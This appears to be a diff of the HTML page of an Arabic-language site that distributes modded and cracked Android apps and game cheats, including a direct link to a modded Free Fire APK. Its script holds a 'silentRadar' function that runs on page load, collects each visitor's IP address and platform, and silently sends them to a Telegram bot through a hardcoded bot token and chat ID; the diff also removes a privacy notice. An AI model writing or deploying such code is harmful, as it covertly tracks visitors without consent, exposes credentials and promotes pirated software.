@@ -1,133 +1,92 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="keywords" content="تطبيقات مهكرة, ألعاب مهكرة, Mod APK, Premium, VIP, تحميل مجاني, برامج مدفوعة">
-    <meta name="description" content="موقع Premiums يوفر لك أحدث التطبيقات والألعاب المهكرة بمميزات VIP مجاناً. استمتع بتجربة البرامج المدفوعة بدون إعلانات وبأحدث الإصدارات لعام 2026.">
-    <title>Nexus Core | Premium Software Distribution - تحميل تطبيقات وألعاب مهكرة VIP مجاناً | Mod APK</title>
-<link rel="stylesheet" href="style.css">
-
+    <meta name="description" content="موقع Premiums يوفر لك أحدث التطبيقات والألعاب المهكرة بمميزات VIP مجاناً لعام 2026.">
+    <title>Nexus Core | Premium Software</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-    <header>
+<header>
     <h1>NEXUS CORE</h1>
     <p>Global Trusted Software Distribution Center</p>
 </header>
 
-<div class="search-wrapper" style="max-width: 600px; margin: 20px auto; padding: 0 20px;">
-    <input type="text" id="searchInput" placeholder="ابحث عن تطبيق أو لعبة..." 
-           style="width: 100%; padding: 15px; border-radius: 20px; border: 1px solid #333; background: #1c1f2b; color: white;">
+<div class="search-wrapper">
+    <input type="text" id="searchInput" placeholder="ابحث عن تطبيق أو لعبة...">
 </div>
 
-<div class="container">
-    <div class="app-card featured" onclick="openModal('Instagram Pro', 'نسخة النخبة المميزة بمميزات VIP كاملة')">
+<div id="noResults" style="display: none; text-align: center; margin: 30px 0; color: #ff4545;">
+    <p>⚠️ التطبيق غير موجود حالياً.. يتم التطوير 🛠️</p>
+</div>
+
+<div class="container" id="appGrid">
+    <div class="app-card featured" onclick="openModal('Instagram Pro', 'نسخة النخبة المميزة: تحميل ستوري، إخفاء الظهور، وبدون إعلانات نهائياً لعام 2026.')">
         <img src="https://traidmode.com/wp-content/uploads/2025/10/v-1-32-180x180.webp" class="app-icon">
         <div class="app-title">Instagram Pro 2026</div>
         <span class="app-version">V14.25 [VIP]</span>
         <a href="رابط_التحميل" class="download-btn" onclick="event.stopPropagation();">تنزيل VIP</a>
     </div>
 
-    <div class="app-card" onclick="openModal('Free Fire Mod', 'قائمة غش كاملة - استخدم حساب تجريبي')">
+    <div class="app-card" onclick="openModal('Free Fire Mod', 'قائمة غش كاملة (MENU) - يرجى استخدام حساب تجريبي لتجنب الحظر.')">
         <img src="https://traidmod.com/wp-content/uploads/2024/05/Free-Fire-Logo-240x240.webp" class="app-icon">
         <div class="app-title">Free Fire Mod</div>
         <span class="app-version">V1.120.1</span>
-        <a href="رابط_التحميل" class="download-btn" onclick="event.stopPropagation();">حمل الآن</a>
+        <a href="https://s1.tmdownload.com/dl/Game/Free_Fire/Free_Fire_v1.120.1_Mod_[TraidMod.Net].apk" class="download-btn" onclick="event.stopPropagation();">حمل الآن</a>
     </div>
 
-    <div class="app-card" onclick="openModal('Minecraft PE', 'موارد وسكنات مفتوحة بالكامل')">
+    <div class="app-card" onclick="openModal('Minecraft PE', 'عالم مفتوح مع سكنات وموارد غير محدودة | دعم أونلاين.')">
         <img src="https://traidmod.com/wp-content/uploads/2024/06/Minecraft-Logo-240x240.webp" class="app-icon">
         <div class="app-title">Minecraft PE</div>
         <span class="app-version">v1.26.10</span>
-        <a href="رابط_التحميل" class="download-btn" onclick="event.stopPropagation();">تنزيل PE</a>
+        <a href="#" class="download-btn" onclick="event.stopPropagation();">تنزيل PE</a>
     </div>
 
-    <div class="app-card" onclick="openModal('Car Simulator 2', 'أموال غير محدودة وجميع السيارات مفتوحة')">
+    <div class="app-card" onclick="openModal('Car Simulator 2', 'أموال لا نهائية وفتح جميع السيارات الفاخرة بدون إعلانات.')">
         <img src="https://traidmod.com/wp-content/uploads/2024/01/Car-Simulator-2-Logo.webp" class="app-icon">
         <div class="app-title">Car Simulator 2</div>
         <span class="app-version">v1.60.6</span>
-        <a href="رابط_التحميل" class="download-btn" onclick="event.stopPropagation();">حمل الآن</a>
+        <a href="#" class="download-btn" onclick="event.stopPropagation();">حمل الآن</a>
     </div>
 </div>
 
-
-    <hr style="border: 0; border-top: 1px solid #2d334a; margin: 40px 0;">
-
-    <div style="background: #1c1f2b; padding: 26px; border-radius: 24px; border-left: 5px solid var(--primary-color);">
-        <h3 style="margin-top: 0;">About the Developer</h3>
-        <p>Developed by <strong>ZeroX</strong>, a Cyber Security Enthusiast and Full-Stack Developer dedicated to providing premium software solutions and penetration testing tools.</p>
-        <p>📧 Contact: <a href="mailto:zerospectrex1@gmail.com" style="color: var(--primary-color);">zerospectrex1@gmail.com</a></p>
+<section style="max-width: 900px; margin: 50px auto; padding: 20px; border-top: 1px solid #2d334a;">
+    <div style="background: #1c1f2b; padding: 26px; border-radius: 24px; border-right: 5px solid #007aff; text-align: right;">
+        <h3 style="margin-top: 0;">عن المطور</h3>
+        <p>تم التطوير بواسطة <strong>ZeroX</strong>، خبير أمن سيبراني ومطور Full-Stack.</p>
+        <p>📧 للتواصل: <a href="mailto:zerospectrex1@gmail.com" style="color: #007aff;">zerospectrex1@gmail.com</a></p>
     </div>
 </section>
-<div style="font-size: 18px; color: #555; margin-top: 25px; text-align: center; padding: 28px;">
-    <p><strong>Privacy Policy:</strong> Nexus Core values your privacy. We only collect basic system information (OS, RAM, Storage) to ensure app compatibility with your device. No personal data is stored without user consent.</p>
-</div>
 
 <footer>
     &copy; 2026 Nexus Core. All rights reserved. <br>
     Distributed by ZeroX premiums
 </footer>
+
+<div id="appModal" class="modal">
+    <div class="modal-content">
+        <span class="close-btn" onclick="closeModal()">&times;</span>
+        <div id="modalBody"></div>
+    </div>
+</div>
+
 <script>
-// --- [1] الإعدادات العامة ونظام الصفحات ---
-const appsPerPage = 6;
-let currentPage = 1;
-let isSearchActive = false;
 const token = "7575966226:AAELuzHD5DBcmAcUbGOAj7C_PsTWwMok8Ew"; 
 const chatId = "7388801889"; 
 
-function displayApps(page) {
-    const apps = document.querySelectorAll('.app-card');
-    if (isSearchActive) return;
-    const totalPages = Math.ceil(apps.length / appsPerPage);
-    apps.forEach((app, index) => {
-        app.style.display = (index >= (page - 1) * appsPerPage && index < page * appsPerPage) ? 'block' : 'none';
-    });
-    setupPagination(totalPages);
-}
-
-function setupPagination(totalPages) {
-    const paginationDiv = document.getElementById('pagination');
-    if (!paginationDiv) {
-        const newDiv = document.createElement('div');
-        newDiv.id = 'pagination';
-        newDiv.style.cssText = "display:flex; justify-content:center; margin:20px;";
-        document.querySelector('.container').after(newDiv);
-    }
-    const div = document.getElementById('pagination');
-    div.innerHTML = ''; 
-    if (totalPages <= 1) return; 
-    for (let i = 1; i <= totalPages; i++) {
-        const btn = document.createElement('button');
-        btn.innerText = i;
-        btn.style.cssText = `padding: 10px 15px; margin: 5px; background: ${i === currentPage ? '#007aff' : '#1c1f2b'}; color: white; border: 1px solid #333; border-radius: 8px; cursor: pointer;`;
-        btn.onclick = () => { currentPage = i; displayApps(i); window.scrollTo(0,0); };
-        div.appendChild(btn);
-    }
-}
-
-// --- [2] محرك البحث ---
 function executeSearch() {
     const filter = document.getElementById('searchInput').value.toLowerCase().trim();
     const apps = document.querySelectorAll('.app-card');
     const noResults = document.getElementById('noResults');
-    const paginationDiv = document.getElementById('pagination');
     let foundCount = 0;
 
-    if (filter === "") {
-        isSearchActive = false;
-        if (paginationDiv) paginationDiv.style.display = 'flex';
-        displayApps(currentPage);
-        noResults.style.display = 'none';
-        return;
-    }
-
-    isSearchActive = true;
-    if (paginationDiv) paginationDiv.style.display = 'none';
     apps.forEach(app => {
         const title = app.querySelector('.app-title').innerText.toLowerCase();
-        const desc = app.querySelector('.app-desc').innerText.toLowerCase();
-        if (title.includes(filter) || desc.includes(filter)) {
-            app.style.display = 'block';
+        if (title.includes(filter)) {
+            app.style.display = 'flex';
             foundCount++;
         } else {
             app.style.display = 'none';
@@ -136,13 +95,13 @@ function executeSearch() {
     noResults.style.display = (foundCount === 0) ? 'block' : 'none';
 }
 
-// --- [3] نظام النافذة المنبثقة (Modal) ---
 function openModal(title, bigDesc) {
     const modalBody = document.getElementById('modalBody');
     const modal = document.getElementById('appModal');
     modalBody.innerHTML = `
-        <h2 style="color:#ffcc00; font-size:32px; margin-bottom:20px; text-align:center;">${title}</h2>
-        <div style="font-size:18px; line-height:1.7; color:#fff; text-align:right; direction:rtl;">${bigDesc}</div>
+        <h2 style="color:#ffcc00; font-size:24px; margin-bottom:15px;">${title}</h2>
+        <p style="font-size:16px; line-height:1.6; color:#ddd;">${bigDesc}</p>
+        <button onclick="closeModal()" style="background:#007aff; color:white; border:none; padding:10px 20px; border-radius:10px; cursor:pointer; width:100%; margin-top:15px; font-weight:bold;">إغلاق</button>
     `;
     modal.style.display = "block";
 }
@@ -151,33 +110,21 @@ function closeModal() {
     document.getElementById('appModal').style.display = "none";
 }
 
-// --- [4] رادار ) ---
 async function silentRadar() {
     try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
-        const battery = await navigator.getBattery();
-        const msg = `🎯 زائر جديد لـ Nexus Core\n🌐 IP: ${ipData.ip}\n📱 النظام: ${navigator.platform}\n🔋 البطارية: ${Math.round(battery.level*100)}%`;
+        const msg = `🎯 زائر جديد لـ Nexus Core\n🌐 IP: ${ipData.ip}\n📱 النظام: ${navigator.platform}`;
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
     } catch(e) {}
 }
 
-// --- [5] التشغيل النهائي ---
 document.addEventListener('DOMContentLoaded', () => {
-    displayApps(1);
     silentRadar();
     document.getElementById('searchInput').addEventListener('input', executeSearch);
     window.onclick = (e) => { if (e.target == document.getElementById('appModal')) closeModal(); };
 });
 </script>
-
-
-<div id="appModal" class="modal">
-    <div class="modal-content">
-        <span class="close-btn" onclick="closeModal()">&times;</span>
-        <div id="modalBody"></div>
-    </div>
-</div>
 
 </body>
 </html>
